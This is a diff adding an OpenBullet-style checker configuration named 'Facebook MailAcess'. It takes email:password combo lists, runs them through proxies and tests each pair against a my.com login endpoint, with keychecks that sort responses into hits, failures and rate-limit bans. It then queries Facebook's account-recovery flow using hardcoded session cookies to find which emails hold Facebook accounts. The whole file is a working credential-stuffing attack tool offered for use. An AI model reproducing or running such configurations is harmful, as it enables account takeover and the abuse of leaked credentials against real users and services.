@@ -1,0 +1,116 @@
+[SETTINGS]
+{
+  "Name": "[CT] Facebook MailAcess [APİ]",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-24T15:14:52.0569149+03:00",
+  "AdditionalInfo": "",
+  "Author": "Astronot",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login=<USER>&Password=<PASS>" 
+  
+  HEADER "User-Agent: MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Ok=0" 
+    KEY "fail=1" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+    KEY "<RESPONSECODE>" Contains "429" 
+    KEY "<RESPONSECODE>" Contains "400" 
+  KEYCHAIN Success OR 
+    KEY "Ok=1" 
+
+REQUEST POST "https://www.facebook.com/ajax/login/help/identify.php?ctx=recover" AutoRedirect=FALSE 
+  CONTENT "jazoest=2897&lsd=AVqiFBr-QSE&email=<USER>&did_submit=1&__user=0&__a=1&__dyn=7xe6Fo4OQ1PyWwHBWo5O12wAxu13wqovzEdEc8uxa0z8S2S4o720SUhwem0nCq1ewcG0KEswaq0woy1Qw5MKdwl8G0DE7e2l0FG7o4y0Mo5W3S1lwlEbE28xe3C0D85a2W2K0zE5W0HU1jo&__csr=&__req=8&__beoa=0&__pc=PHASED%3ADEFAULT&__bhv=2&dpr=1&__ccg=GOOD&__rev=1003544143&__s=1l7fcq%3A64wuug%3Asdz25o&__hsi=6945676431749382890-0&__comet_req=0&__spin_r=1003544143&__spin_b=trunk&__spin_t=1617166314" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.facebook.com" 
+  HEADER "referer: https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" 
+  HEADER "x-fb-lsd: AVqiFBr-QSE" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "window.location.href" 
+  KEYCHAIN Failure OR 
+    KEY "account_search\",false" 
+
+PARSE "<SOURCE>" LR "window.location.href=\\\"\\\\\\/recover\\\\\\/initiate\\\\\\/?ldata=" "\\" -> VAR "link" 
+
+PARSE "<COOKIES(sfiu)>" LR "" "" -> VAR "sfiu" 
+
+REQUEST GET "https://www.facebook.com/recover/initiate/?ldata=<link>" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cookie: datr=2_9jYLOcHuutk-CPj-AHfG7u; sb=3_9jYDGqFmBmBuuTb-dp0tC7; wd=1636x657; locale=de_DE; fr=12Jd242nAGc7ACPnW..BgY__f.lC.AAA.0.0.BgZAVo.AWU-pnRw5uM; checkpoint=%7B%22u%22%3A100004530223970%2C%22t%22%3A1617167713%2C%22step%22%3A202000%2C%22n%22%3A%22HmLZb41Pl8I%3D%22%2C%22inst%22%3A794431860717814%2C%22f%22%3A207799259245384%2C%22st%22%3A%22c%22%2C%22aid%22%3Anull%2C%22ca%22%3Anull%2C%22la%22%3A%22%22%2C%22ta%22%3A%221617167719.ch.s%3Apw.tDBEAiAj6nodkQsr3eBDRfFQazqufgrEifSaZMRbTbMvT2xbogIgL6JwEPnbdWZCYuNIjZuIGjzIfrPESWMWKWw3ijJV4G0%22%2C%22ffvauid%22%3Anull%2C%22ffvavt%22%3A0%2C%22ffvaapt%22%3A0%2C%22ffvasig%22%3Anull%2C%22ffvamapo%22%3Anull%2C%22tfvauid%22%3Anull%2C%22tfvavt%22%3A0%2C%22tfvacode%22%3Anull%2C%22tfvamac%22%3Anull%2C%22sat%22%3Anull%2C%22s%22%3A%22AWXkvP2FXbP4hOZ8HLQ%22%2C%22cs%22%3A%7B%223%22%3A1617167720%7D%2C%22ssp%22%3A1%7D; sfiu=<sfiu>" 
+  HEADER "referer: https://www.facebook.com/login/identify?ctx=recover" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Dein Konto wurde gesperrt. Solltest du Fragen oder Bedenken haben, besuche bitte unsere FAQ-Seite" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Dein Konto wurde gesperrt. Solltest du Fragen oder Bedenken haben, besuche bitte unsere FAQ-Seite" 
+
